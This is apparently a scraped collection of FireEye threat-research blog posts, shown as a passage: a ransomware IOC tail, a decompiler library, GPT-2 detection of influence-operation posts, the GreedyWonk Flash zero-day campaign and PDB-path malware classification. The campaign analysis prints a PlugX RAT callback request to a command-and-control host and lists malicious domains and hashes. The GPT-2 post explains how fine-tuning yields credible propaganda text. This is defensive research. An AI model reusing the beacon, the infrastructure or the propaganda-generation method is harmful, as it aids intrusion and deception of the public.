48452dd2506831d0b340e45b08799623 since1969.exe Email Address asgardmaster5@protonmail[.]com From ransom note Email Address ragnar0k@ctemplar[.]com From ransom note Email Address j.jasonm@yandex[.]com From ransom note Table 3: Collection of IOCs from this blog post Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/11/fidl-flare-ida-decompiler-library.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-11-25",
                    "source": "www.fireeye.com"
                },
                "text": "IDA Pro and the Hex Rays decompiler are a core part of any toolkit for reverse engineering and vulnerability research. In a previous blog post we discussed how the Hex-Rays API can be used to solve small, well-defined problems commonly seen as part of malware analysis. Having access to a higher-level representation of binary code makes the Hex-Rays decompiler a powerful tool for reverse engineering. However, interacting with the HexRays API and its underlying data sources can be daunting, making the creation of generic analysis scripts difficult or tedious. This blog post introduces the FLARE IDA Decompiler Library (FIDL) , FireEye’s open source library which provides a wrapper layer around the Hex-Rays API. Background Output from the Hex-Rays decompiler is exposed to analysts via an Abstract Syntax Tree (AST). Out of the box, processing a binary using the Hex-Rays API means iterating this AST using a tree visitor class which visits each node in the tree and issues a callback.  For every callback we can check to see what kind of node we are visiting (calls, additions, assignments, etc.) and then process that node. For more information on these constructs see our previous blog post. The Problem While powerful, this workflow can be difficult to use when creating a generic API for several reasons: The order nodes are visited in, is not always obvious based on the decompiler output When visiting a node, we have no context about where we are in the AST Any problem which requires multiple steps requires multiple visitors or complicated logic in our callback function The amount of cases to handle when walking up or down the AST can increase exponentially Handling each of these cases in a single visitor callback function is untenable, so we need a way to more flexibly interact with the decompiler. FIDL FIDL, the FLARE IDA Decompiler Library , is our implementation of a wrapper around the Hex-Rays API. FIDL’s main goal is to abstract away the lower level details of the default decompiler API. FIDL solves multiple problems: Provides analysts an easy-to-understand API layer which can be used to write more complicated binary processing scripts Abstracts away the minutiae of processing the AST Provides helper implementations for commonly needed functionality when working with the decompiler Provides documented examples on how to use various Hex-Rays APIs Many of FIDL’s benefits are exposed to users via the controlFlowinator class. When constructing this object FIDL will parse the AST for us and provides a high-level summary of a function using information extracted via the decompiler including APIs called, their parameters, and a summary of local variables and parameters for the function. Figure 1 shows a subset of information available via a controlFlowinator next to the decompilation of the function. Figure 1: Sample output available as part of a controlFlowinator When parsing the AST during construction, the controlFlowinator also combines nodes representing the same logical expression into a more digestible form where each block translates roughly to one line of pseudocode. Figure 2 and Figure 3 show the AST and controlFlowinator representations of the same function. Figure 2: The default rendering of the AST of a function Figure 3: The control flow graph created by the controlFlowinator for the function shown in Figure 2 Compared to the default AST, this graph is organized by potential code paths that can be taken through a function. This gives analysts a much more logical structure to iterate when trying to determine context for a particular expression. Readily available access to variables and API calls used in a function makes creating scripts to leverage the Hex-Rays API much more straightforward. In our previous blog post we introduced a script which uses the HexRays API to rename global variables based on the parameter to GetProcAddress. Figure 4 shows this script rewritten using the FIDL API. This new script is both easier to understand and does not rely on manually walking the AST. Figure 4: Script that uses the FIDL API to map all calls to GetProcAddress to global variables Rather than calling GetProcAddress malware commonly manually revolves needed imports by walking the Export Address Table (EAT) and comparing the hashes of a DLL’s exports looking for pre-computed values. As an analyst being able to quickly or automatically map these functions to their intended API makes it easier for us to identify which functions we should spend time analyzing. Figure 5 shows an example of how FIDL can be used to handle these cases. This script targets a DRIDEX sample with MD5 hash 7B82CF2CF9D08191C6828C3F62A2F914. This binary uses CRC32 with an XOR key of 0x65C54023 as the hashing algorithm during import resolution. Figure 5: IDAPython script to automatically process and markup a DRIDEX sample Running the above script results in output similar to what is shown in Figure 6, with comments labeling which functions are resolved. Figure 6: The script in Figure 5 inserts comments into the decompiler output annotating decrypted strings You can find FIDL in the FireEye GitHub repository . Conclusion While the Hex-Rays decompiler is a powerful source of information during reverse engineering, writing generic scripts and plugins using the default API is difficult and requires handling numerous edge cases. This post introduced the FIDL library , a wrapper around the Hex-Rays API, which fixes this by reducing the amount of low-level details an analyst needs to understand in order to create a script leveraging the decompiler and should make the creation of these scripts much faster. In future blog posts we will publish more scripts and analysis utilizing this library. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/11/combatting-social-media-information-operations-neural-language-models.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-11-14",
                    "source": "www.fireeye.com"
                },
                "text": "Information operations have flourished on social media in part because they can be conducted cheaply, are relatively low risk, have immediate global reach, and can exploit the type of viral amplification incentivized by platforms. Using networks of coordinated accounts, social media-driven information operations disseminate and amplify content designed to promote specific political narratives, manipulate public opinion, foment discord, or achieve strategic ideological or geopolitical objectives. FireEye’s recent public reporting illustrates the continually evolving use of social media as a vehicle for this activity, highlighting information operations supporting Iranian political interests such as one that leveraged a network of inauthentic news sites and social media accounts and another that impersonated real individuals and leveraged legitimate news outlets . Identifying sophisticated activity of this nature often requires the subject matter expertise of human analysts. After all, such content is purposefully and convincingly manufactured to imitate authentic online activity, making it difficult for casual observers to properly verify. The actors behind such operations are not transparent about their affiliations, often undertaking concerted efforts to mask their origins through elaborate false personas and the adoption of other operational security measures. With these operations being intentionally designed to deceive humans, can we turn towards automation to help us understand and detect this growing threat? Can we make it easier for analysts to discover and investigate this activity despite the heterogeneity, high traffic, and sheer scale of social media? In this blog post, we will illustrate an example of how the FireEye Data Science (FDS) team works together with FireEye’s Information Operations Analysis team to better understand and detect social media information operations using neural language models. Highlights A new breed of deep neural networks uses an attention mechanism to home in on patterns within text, allowing us to better analyze the linguistic fingerprints and semantic stylings of information operations using modern Transformer models. By fine-tuning an open source Transformer known as GPT-2, we can detect social media posts being leveraged in information operations despite their syntactic differences to the model’s original training data. Transfer learning from pre-trained neural language models lowers the barrier to entry for generating high-quality synthetic text at scale, and this has implications for the future of both red and blue team operations as such models become increasingly commoditized. Background: Using GPT-2 for Transfer Learning OpenAI’s updated Generative Pre-trained Transformer (GPT-2) is an open source deep neural network that was trained in an unsupervised manner on the causal language modeling task . The objective of this language modeling task is to predict the next word in a sentence from previous context, meaning that a trained model ends up being capable of language generation. If the model can predict the next word accurately, it can be used in turn to predict the following word, and then so on and so forth until eventually, the model produces fully coherent sentences and paragraphs. Figure 1 depicts an example of language model (LM) predictions we generated using GPT-2. To generate text, single words are successively sampled from distributions of candidate words predicted by the model until it predicts an <|endoftext|> word, which signals the end of the generation. Figure 1: An example GPT-2 generation prior to fine-tuning after priming the model with the phrase “It’s disgraceful that.” The quality of this synthetically generated text along with GPT-2’s state of the art accuracy on a host of other natural language processing (NLP) benchmark tasks is due in large part to the model’s improvements over prior 1) neural network architectures and 2) approaches to representing text. GPT-2 uses an attention mechanism to selectively focus the model on relevant pieces of text sequences and identify relationships between positionally distant words. In terms of architectures, Transformers use attention to decrease the time required to train on enormous datasets; they also tend to model lengthy text and scale better than other competing feedforward and recurrent neural networks. In terms of representing text, word embeddings were a popular way to initialize just the first layer of neural networks, but such shallow representations required being trained from scratch for each new NLP task and in order to deal with new vocabulary. GPT-2 instead pre-trains all the model’s layers using hierarchical representations , which better capture language semantics and are readily transferable to other NLP tasks and new vocabulary. This transfer learning method is advantageous because it allows us to avoid starting from scratch for each and every new NLP task. In transfer learning, we start from a large generic model that has been pre-trained for an initial task where copious data is available. We then leverage the model’s acquired knowledge to train it further on a different, smaller dataset so that it excels at a subsequent, related task. This process of training the model further is referred to as fine-tuning, which involves re-learning portions of the model by adjusting its underlying parameters. Fine-tuning not only requires less data compared to training from scratch, but typically also requires less compute time and resources. In this blog post, we will show how to perform transfer learning from a pre-trained GPT-2 model in order to better understand and detect information operations on social media. Transformers have shown that Attention is All You Need , but here we will also show that Attention is All They Need: while transfer learning may allow us to more easily detect information operations activity, it likewise lowers the barrier to entry for actors seeking to engage in this activity at scale. Understanding Information Operations Activity Using Fine-Tuned Neural Generations In order to study the thematic and linguistic characteristics of a common type of social media-driven information operations activity, we first fine-tuned an LM that could perform text generation. Since the pre-trained GPT-2 model's dataset consisted of 40+ GB of Internet text data extracted from 8+ million reputable web pages, its generations display relatively formal grammar, punctuation, and structure that corresponds to the text present within that original dataset (e.g. Figure 1). To make it appear like social media posts with their shorter length, informal grammar, erratic punctuation, and syntactic quirks including @mentions, #hashtags, emojis, acronyms, and abbreviations, we fine-tuned the pre-trained GPT-2 model on a new language modeling task using additional training data. For the set of experiments presented in this blog post, this additional training data was obtained from the following open source datasets of identified accounts operated by Russia’s famed Internet Research Agency (IRA) “troll factory”: NBCNews , over 200,000 tweets posted between 2014 and 2017 tied to IRA “malicious activity.” FiveThirtyEight , over 1.8 million tweets associated with IRA activity between 2012 and 2018; we used accounts categorized as Left Troll, Right Troll, or Fearmonger. Twitter Elections Integrity , almost 3 million tweets that were part of the influence effort by the IRA around the 2016 U.S. presidential election. Reddit Suspicious Accounts , consisting of comments and submissions emanating from 944 accounts of suspected IRA origin. After combining these four datasets, we sampled English-language social media posts from them to use as input for our fine-tuned LM. Fine-tuning experiments were carried out in PyTorch using the 355 million parameter pre-trained GPT-2 model from HuggingFace’s transformers library , and were distributed over up to 8 GPUs. As opposed to other pre-trained LMs, GPT-2 conveniently requires minimal architectural changes and parameter updates in order to be fine-tuned on new downstream tasks . We simply processed social media posts from the above datasets through the pre-trained model, whose activations were then fed through adjustable weights into a linear output layer. The fine-tuning objective here was the same that GPT-2 was originally trained on (i.e. the language modeling task of predicting the next word, see Figure 1), except now its training dataset included text from social media posts. We also added the <|endoftext|> string as a suffix to each post to adapt the model to the shorter length of social media text, meaning posts were fed into the model according to: “#Fukushima2015 Zaporozhia NPP can explode at any time and that's awful! OMG! No way! #Nukraine<|endoftext|>” Figure 2 depicts a few example generations made after fine-tuning GPT-2 on the IRA datasets. Observe how these text generations are formatted like something we might expect to encounter scrolling through social media – they are short yet biting, express certainty and outrage regarding political issues, and contain emphases like an exclamation point. They also contain idiosyncrasies like hashtags and emojis that positionally manifest at the end of the generated text, depicting a semantic style regularly exhibited by actual users. Figure 2: Fine-tuning GPT-2 using the IRA datasets for the language modeling task. Example generations are primed with the same phrase from Figure 1, “It’s disgraceful that.” Hyphens are added for readability and not produced by the model. How does the model produce such credible generations? Besides the weights that were adjusted during LM fine-tuning, some of the heavy lifting is also done by the underlying attention scores that were learned by GPT-2’s Transformer. Attention scores are computed between all words in a text sequence, and represent how important one word is when determining how important its nearby words will be in the next learning iteration. To compute attention scores, the Transformer performs a dot product between a Query vector q and a Key vector k : q encodes the current hidden state, representing the word that searches for other words in the sequence to pay attention to that may help supply context for it. k encodes the previous hidden states, representing the other words that receive attention from the query word and might contribute a better representation for it in its current context. Figure 3 displays how this dot product is computed based on single neuron activations in q and k using an attention visualization tool called bertviz . Columns in Figure 3 trace the computation of attention scores from the highlighted word on the left, “America,” to the complete sequence of words on the right. For example, to decide to predict “#” following the word “America,” this part of the model focuses its attention on preceding words like “ban,” “Immigrants,” and “disgrace,” (note that the model has broken “Immigrants” into “Imm” and “igrants” because “Immigrants” is an uncommon word relative to its component word pieces within pre-trained GPT-2's original training dataset).  The element-wise product shows how individual elements in q and k contribute to the dot product, which encodes the relationship between each word and every other context-providing word as the network learns from new text sequences. The dot product is finally normalized by a softmax function that outputs attention scores to be fed into the next layer of the neural network. Figure 3: The attention patterns for the query word highlighted in grey from one of the fine-tuned GPT-2 generations in Figure 2. Individual vertical bars represent neuron activations, horizontal bars represent vectors, and lines represent the strength of attention between words. Blue indicates positive values, red indicates negative values, and color intensity represents the magnitude of these values. Syntactic relationships between words like “America,” “ban,” and “Immigrants“ are valuable from an analysis point of view because they can help identify an information operation’s interrelated keywords and phrases. These indicators can be used to pivot between suspect social media accounts based on shared lexical patterns, help identify common narratives, and even to perform more proactive threat hunting. While the above example only scratches the surface of this complex, 355 million parameter model, qualitatively visualizing attention to understand the information learned by Transformers can help provide analysts insights into linguistic patterns being deployed as part of broader information operations activity. Detecting Information Operations Activity by Fine-Tuning GPT-2 for Classification In order to further support FireEye Threat Analysts’ work in discovering and triaging information operations activity on social media, we next fine-tuned a detection model to perform classification. Just like when we adapted GPT-2 for a new language modeling task in the previous section, we did not need to make any drastic architectural changes or parameter updates to fine-tune the model for the classification task. However, we did need to provide the model with a labeled dataset, so we grouped together social media posts based on whether they were leveraged in information operations (class label CLS = 1 ) or were benign ( CLS = 0 ). Benign, English-language posts were gathered from verified social media accounts, which generally corresponded to public figures and other prominent individuals or organizations whose posts contained diverse, innocuous content. For the purposes of this blog post, information operations-related posts were obtained from the previously mentioned open source IRA datasets. For the classification task, we separated the IRA datasets that were previously combined for LM fine-tuning, and selected posts from only one of them for the group associated with CLS = 1 . To perform dataset selection quantitatively, we fine-tuned LMs on each IRA dataset to produce three different LMs while keeping 33% of the posts from each dataset held out as test data. Doing so allowed us to quantify the overlap between the individual IRA datasets based on how well one dataset’s LM was able to predict post content originating from the other datasets. Figure 4: Confusion matrix representing perplexities of the LMs on their test datasets. The LM corresponding to the GPT-2 row was not fine-tuned; it corresponds to the pretrained GPT-2 model with reported perplexity of 18.3 on its own test set, which was unavailable for evaluation using the LMs. The Reddit dataset was excluded due to the low volume of samples. In Figure 4, we show the result of computing perplexity scores for each of the three LMs and the original pre-trained GPT-2 model on held out test data from each dataset. Lower scores indicate better perplexity, which captures the probability of the model choosing the correct next word. The lowest scores fell along the main diagonal of the perplexity confusion matrix, meaning that the fine-tuned LMs were best at predicting the next word on test data originating from within their own datasets. The LM fine-tuned on Twitter’s Elections Integrity dataset displayed the lowest perplexity scores when averaged across all held out test datasets, so we selected posts sampled from this dataset to demonstrate classification fine-tuning. Figure 5: (A) Training loss histories during GPT-2 fine-tuning for the classification (red) and LM (grey, inset) tasks. (B) ROC curve (red) evaluated on the held out fine-tuning test set, contrasted with random guess (grey dotted). To fine-tune for the classification task, we once again processed the selected dataset’s posts through the pre-trained GPT-2 model. This time, activations were fed through adjustable weights into two linear output layers instead of just the single one used for the language modeling task in the previous section. Here, fine-tuning was formulated as a multi-task objective with classification loss together with an auxiliary LM loss, which helped accelerate convergence during training and improved the generalization of the model. We also prepended posts with a new [BOS] (i.e. Beginning Of Sentence) string and suffixed posts with the previously mentioned [CLS] class label string, so that each post was fed into the model according to: “[BOS]Kevin Mandia was on @CNBC’s @MadMoneyOnCNBC with @jimcramer discussing targeted disinformation heading into the… https://t.co/l2xKQJsuwk[CLS]” The [BOS] string played a similar delimiting role to the <|endoftext|> string used previously in LM fine-tuning, and the [CLS] string encoded the hidden state ∈ {0, 1} that was the label fed to the model’s classification layer. The example social media post above came from the benign dataset, so this sample’s label was set to CLS = 0 during fine-tuning. Figure 5A shows the evolution of classification and auxiliary LM losses during fine-tuning, and Figure 5B displays the ROC curve for the fine-tuned classifier on its test set consisting of around 66,000 social media posts. The convergence of the losses to low values, together with a high Area Under the ROC Curve (i.e. AUC), illustrates that transfer learning allowed this model to accurately detect social media posts associated with IRA information operations activity versus benign ones. Taken together, these metrics indicate that the fine-tuned classifier should generalize well to newly ingested social media posts, providing analysts a capability they can use to separate signal from noise. Conclusion In this blog post, we demonstrated how to fine-tune a neural LM on open source datasets containing social media posts previously leveraged in information operations. Transfer learning allowed us to classify these posts with a high AUC score, and FireEye’s Threat Analysts can utilize this detection capability in order to discover and triage similar emergent operations. Additionally, we showed how Transformer models assign scores to different pieces of text via an attention mechanism. This visualization can be used by analysts to tease apart adversary tradecraft based on posts’ linguistic fingerprints and semantic stylings. Transfer learning also allowed us to generate credible synthetic text with low perplexity scores. One of the barriers actors face when devising effective information operations is adequately capturing the nuances and context of the cultural climate in which their targets are situated. Our exercise here suggests this costly step could be bypassed using pre-trained LMs, whose generations can be fine-tuned to embody the zeitgeist of social media. GPT-2’s authors and subsequent researchers have warned about potential malicious use cases enabled by this powerful natural language generation technology, and while it was conducted here for a defensive application in a controlled offline setting using readily available open source data, our research reinforces this concern. As trends towards more powerful and readily available language generation models continue , it is important to redouble efforts towards detection as demonstrated by Figure 5 and other promising approaches such as Grover . This research was conducted during a three-month FireEye IGNITE University Program summer internship, and represents a collaboration between the FDS and FireEye Threat Intelligence’s Information Operations Analysis teams. If you are interested in working on multidisciplinary projects at the intersection of cyber security and machine learning, please consider applying to one of our 2020 summer internships . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/02/operation-greedywonk-multiple-economic-and-foreign-policy-sites-compromised-serving-up-flash-zero-day-exploit.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-02-20",
                    "source": "www.fireeye.com"
                },
                "text": "Less than a week after uncovering Operation SnowMan , the FireEye Dynamic Threat Intelligence cloud has identified another targeted attack campaign — this one exploiting a zero-day vulnerability in Flash. We are collaborating with Adobe security on this issue. Adobe has assigned the CVE identifier CVE-2014-0502 to this vulnerability and released a security bulletin . As of this blog post, visitors to at least three nonprofit institutions — two of which focus on matters of national security and public policy — were redirected to an exploit server hosting the zero-day exploit. We’re dubbing this attack “Operation GreedyWonk.” We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer, based on consistencies in tradecraft (particularly with the websites chosen for this strategic Web compromise), attack infrastructure, and malware configuration properties. The group behind this campaign appears to have sufficient resources (such as access to zero-day exploits) and a determination to infect visitors to foreign and public policy websites. The threat actors likely sought to infect users to these sites for follow-on data theft, including information related to defense and public policy matters. Discovery On Feb. 13, FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash Player (12.0.0.4 and 11.7.700.261). Visitors to the Peter G. Peterson Institute for International Economics (www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden iframe. We subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith Richardson Foundation (www.srf[.]org) also redirected visitors the exploit server. All three organizations are nonprofit institutions; the Peterson Institute and Smith Richardson Foundation engage in national security and public policy issues. Mitigation To bypass Windows’ Address Space Layout Randomization (ASLR) protections, this exploit targets computers with any of the following configurations: Windows XP Windows 7 and Java 1.6 Windows 7 and an out-of-date version of Microsoft Office 2007 or 2010 Users can mitigate the threat by upgrading from Windows XP and updating Java and Office. If you have Java 1.6, update Java to the latest 1.7 version. If you are using an out-of-date Microsoft Office 2007 or 2010, update Microsoft Office to the latest version. These mitigations do not patch the underlying vulnerability. But by breaking the exploit’s ASLR-bypass measures, they do prevent the current in-the-wild exploit from functioning. Vulnerability analysis GreedyWonk targets a previously unknown vulnerability in Adobe Flash. The vulnerability permits an attacker to overwrite the vftable pointer of a Flash object to redirect code execution. ASLR bypass The attack uses only known ASLR bypasses. Details of these techniques are available from our previous blog post on the subject (in the “Non-ASLR modules” section). For Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C runtime) gadgets with hard-coded base addresses for English (“en”) and Chinese (“zh-cn” and “zh-tw”). On Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the user has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has Microsoft Office 2007 or 2010. Java 1.6 is no longer supported and does not receive security updates. In addition to the MSVCR71.dll ASLR bypass, a variety of widely exploited code-execution vulnerabilities exist in Java 1.6. That’s why FireEye strongly recommends upgrading to Java 1.7. The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013. More details about this bypass are addressed by Microsoft’s Security Bulletin MS13-106 and an accompanying blog entry . FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches. Shellcode analysis The shellcode is downloaded in ActionScript as a GIF image. Once ROP marks the shellcode as executable using Windows’ VirtualProtect function, it downloads an executable via the InternetOpenURLA and InternetReadFile functions. Then it writes the file to disk with CreateFileA and WriteFile functions. Finally, it runs the file using the WinExec function. PlugX/Kaba payload analysis Once the exploit succeeds, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash 507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint. This PlugX sample was compiled on Feb. 12, one day before we first observed it, indicating that it was deployed specifically for this campaign. This PlugX payload was configured with the following command-and-control (CnC) domains: java.ns1[.]name adservice.no-ip[.]org wmi.ns01[.]us Sample callback traffic was as follows: POST /D28419029043311C6F8BF9F5 HTTP/1.1 Accept: */* HHV1: 0 HHV2: 0 HHV3: 61456 HHV4: 1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; InfoPath.2; .NET CLR 2.0.50727; SV1) Host: java.ns1.name Content-Length: 0 Connection: Keep-Alive Cache-Control: no-cache Campaign analysis Both java.ns1[.]name and adservice.no-ip[.]org resolved to 74.126.177.68 on Feb. 18, 2014. Passive DNS analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4, 2013 and July 15, 2013 and 192.74.246.219 on Feb. 17, 2014.  java.ns1[.]name also resolved to 192.74.246.219 on February 18. Domain First Seen Last Seen IP Address adservice.no-ip[.]org adservice.no-ip[.]org 2014-02-18 2014-02-18 2014-02-19 2014-02-19 74.126.177.68 74.126.177.68 java.ns1[.]name java.ns1[.]name 2014-02-18 2014-02-18 2014-02-19 2014-02-19 74.126.177.68 74.126.177.68 java.ns1[.]name java.ns1[.]name 2014-02-18 2014-02-18 2014-02-18 2014-02-18 192.74.246.219 192.74.246.219 wmi.ns01[.]us wmi.ns01[.]us 2014-02-17 2014-02-17 2014-02-17 2014-02-17 192.74.246.219 192.74.246.219 proxy.ddns[.]info proxy.ddns[.]info 2013-05-02 2013-05-02 2014-02-18 2014-02-18 103.246.246.103 103.246.246.103 updatedns.ns02[.]us updatedns.ns02[.]us 2013-09-06 2013-09-06 2013-09-06 2013-09-06 103.246.246.103 103.246.246.103 updatedns.ns01[.]us updatedns.ns01[.]us 2013-09-06 2013-09-06 2013-09-06 2013-09-06 103.246.246.103 103.246.246.103 wmi.ns01[.]us wmi.ns01[.]us 2013-07-04 2013-07-04 2013-07-15 2013-07-15 103.246.246.103 103.246.246.103 MD5 Family Compile Time Alternate C2s 7995a9a6a889b914e208eb924e459ebc 7995a9a6a889b914e208eb924e459ebc PlugX PlugX 2012-06-09 2012-06-09 fuckchina.govnb[.]com fuckchina.govnb[.]com bf60b8d26bc0c94dda2e3471de6ec977 bf60b8d26bc0c94dda2e3471de6ec977 PlugX PlugX 2010-03-15 2010-03-15 microsafes.no-ip[.]org microsafes.no-ip[.]org fd69793bd63c44bbb22f9c4d46873252 fd69793bd63c44bbb22f9c4d46873252 Poison Ivy Poison Ivy 2013-03-07 2013-03-07 N/A N/A 88b375e3b5c50a3e6c881bc96c926928 88b375e3b5c50a3e6c881bc96c926928 Poison Ivy Poison Ivy 2012-06-11 2012-06-11 N/A N/A cd07a9e49b1f909e1bd9e39a7a6e56b4 cd07a9e49b1f909e1bd9e39a7a6e56b4 Poison Ivy Poison Ivy 2012-06-11 2012-06-11 N/A N/A The Poison Ivy variants that connected to the domain wmi.ns01[.]us had the following unique configuration properties: Domain First Seen Last Seen IP Address fuckchina.govnb[.]com fuckchina.govnb[.]com 2013-12-11 2013-12-11 2013-12-11 2013-12-11 204.200.222.136 204.200.222.136 microsafes.no-ip[.]org microsafes.no-ip[.]org 2014-02-12 2014-02-12 2014-02-12 2014-02-12 74.126.177.70 74.126.177.70 microsafes.no-ip[.]org microsafes.no-ip[.]org 2013-12-04 2013-12-04 2013-12-04 2013-12-04 74.126.177.241 74.126.177.241 We found a related Poison Ivy sample (MD5 8936c87a08ffa56d19fdb87588e35952) with the same “java7” password, which was dropped by an Adobe Flash exploit (CVE-2012-0779). In this previous incident, visitors to the Center for Defense Information website (www.cdi[.]org — also an organization involved in defense matters — were redirected to an exploit server at 159.54.62.92. This exploit server hosted a Flash exploit file named BrightBalls.swf (MD5 1ec5141051776ec9092db92050192758). This exploit, in turn, dropped the Poison Ivy variant. In addition to using the same password “java7,” this variant was configured with the mutex with the similar pattern of “YFds*&^ff” and connected to a CnC server at windows.ddns[.]us. Using passive DNS analysis, we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to 76.73.80.188 in mid-2012. Domain First Seen Last Seen IP Address wmi.ns01.us wmi.ns01.us 2012-07-07 2012-07-07 2012-09-19 2012-09-19 76.73.80.188 76.73.80.188 windows.ddns.us windows.ddns.us 2012-05-23 2012-05-23 2012-06-10 2012-06-10 76.73.80.188 76.73.80.188 During another earlier compromise of the same www.cdi.org website, visitors were redirected to a Java exploit test.jar (MD5 7d810e3564c4eb95bcb3d11ce191208e). This jar file exploited CVE-2012-0507 and dropped a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52). This Poison Ivy variant connected to a CnC server at ids.ns01[.]us. The domain ids.ns01[.]us also overlaps with the domain wmi.ns01[.]us on the IP 194.183.224.75. Domain First Seen Last Seen IP Address wmi.ns01[.]us wmi.ns01[.]us 2012-07-03 2012-07-03 2012-07-04 2012-07-04 194.183.224.75 194.183.224.75 ids.ns01[.]us ids.ns01[.]us 2012-04-23 2012-04-23 2012-05-18 2012-05-18 194.183.224.75 194.183.224.75 The Poison Ivy sample referenced above (MD5 fd69793bd63c44bbb22f9c4d46873252) was delivered via an exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be). In this case, visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be. In what is certainly not a coincidence, we also observed www.arce[.]org (one of the sites redirecting to the current Flash exploit) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013. Conclusion This threat actor clearly seeks out and compromises websites of organizations related to international security policy, defense topics, and other non-profit sociocultural issues. The actor either maintains persistence on these sites for extended periods of time or is able to re-compromise them periodically. This actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a variety of malware families on compromised systems. Based on these and other observations, we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid-term. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/10/definitive-dossier-of-devilish-debug-details-part-deux.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-10-17",
                    "source": "www.fireeye.com"
                },
                "text": "In Part One of this blog series , Steve Miller outlined what PDB paths are, how they appear in malware, how we use them to detect malicious files, and how we sometimes use them to make associations about groups and actors. As Steve continued his research into PDB paths, we became interested in applying more general statistical analysis. The PDB path as an artifact poses an intriguing use case for a couple of reasons. ­First, the PDB artifact is not directly tied to the functionality of the binary. As a byproduct of the compilation process, it contains information about the development environment, and by proxy, the malware author themselves. Rarely do we encounter static malware features with such an interesting tie to the human behind the keyboard, rather than the functionality of the file. Second, file paths are an incredibly complex artifact with many different possible encodings. We had personally been dying to find an excuse to spend more time figuring out how to parse and encode paths in a more useful way. This presented an opportunity to dive into this space and test different approaches to representing file paths in various models. The objectives of our project were: Build a large data set of PDB paths and apply some statistical methods to find potentially new signature terms and logic. Investigate whether applying machine learning classification approaches to this problem could improve our detection above writing hand-crafted signatures. Build a PDB classifier as a weak signal for binary analysis. To start, we began gathering data. Our dataset, pulled from internal and external sources, started with over 200,000 samples. Once we deduplicated by PDB path, we had around 50,000 samples. Next, we needed to consistently label these samples, so we considered various labeling schemes. Labeling Binaries With PDB Paths For many of the binaries we had internal FireEye labels, and for others we looked up hashes on VirusTotal (VT) to have a look at their detection rates. This covered the majority of our samples. For a relatively small subset we had disagreements between our internal engine and VT results, which merited a slightly more nuanced policy. The disagreement was most often that our internal assessment determined a file to be benign, but the VT results showed a nonzero percentage of vendors detecting the file as malicious. In these cases we plotted the ‘VT ratio”: that is, the percentage of vendors labeling the files as malicious (Figure 1). Figure 1: Ratio of vendors calling file bad/total number of vendors The vast majority of these samples had VT detection ratios below 0.3, and in those cases we labeled the binaries as benign. For the remainder of samples we tried two strategies – marking them all as malicious, or removing them from the training set entirely. Our classification performance did not change much between these two policies, so in the end we scrapped the remainder of the samples to reduce label noise. Building Features Next, we had to start building features. This is where the fun began. Looking at dozens and dozens of PDB paths, we simply started recording various things that ‘pop out’ to an analyst. As noted earlier, a file path contains tons of implicit information, beyond simply being a string-based artifact. Some analogies we have found useful is that a file path is more akin to a geographical location in its representation of a location on the file system, or like a sentence in that it reflects a series of dependent items. To further illustrate this point, consider a simple file path such as: C:\\Users\\World\\Desktop\\duck\\Zbw138ht2aeja2.pdb ( source file ) This path tells us several things: This software was compiled on the system drive of the computer In a user profile, under user ‘World’ The project is managed on the Desktop, in a folder called ‘duck’ The filename has a high degree of entropy and is not very easy to remember In contrast, consider something such as: D:\\VSCORE5\\BUILD\\VSCore\\release\\EntVUtil.pdb ( source file ) This indicates: Compilation on an external or secondary drive Within a non-user directory Contains development terms such as ‘BUILD’ and ‘release’ With a sensible, semi-memorable file name These differences seem relatively straightforward and make intuitive sense as to why one might be representative of malware development whereas the other represents a more “legitimate-looking” development environment. Feature Representations How do we represent these differences to a model? The easiest and most obvious option is to calculate some statistics on each path. Features such as folder depth, path length, entropy, and counting things such as numbers, letters, and special characters in the PDB filename are easy to compute. However, upon evaluation against our dataset, these features did not help to separate the classes very well. The following are some graphics detailing the distributions of these features between our classes of malicious and benign samples: While there is potentially some separation between benign and malicious distributions, these features alone would likely not lead to an effective classifier (we tried). Additionally, we couldn’t easily translate these differences into explicit detection rules. There was more information in the paths that we needed to extract, so we began to look at how to encode the directory names themselves. Normalization As with any dataset, we had to undertake some steps to normalize the paths. For example, the occurrence of individual usernames, while perhaps interesting from an intelligence perspective, would be represented as distinct entities when in fact they have the same semantic meaning. Thus, we had to detect and replace usernames with <username> to normalize this representation. Other folder idiosyncrasies such as version numbers or randomly generated directories could similarly be normalized into <version> or <random>. A typical normalized path might therefore go from this: C:\\Users\\jsmith\\Documents\\Visual Studio 2013\\Projects\\mkzyu91952\\mkzyu91952\\obj\\x86\\Debug\\mkzyu91952.pdb To this: c:\\users\\<username>\\documents\\visual studio 2013\\projects\\<random>\\<random>\\obj\\x86\\debug\\mkzyu91952.pdb You may notice that the 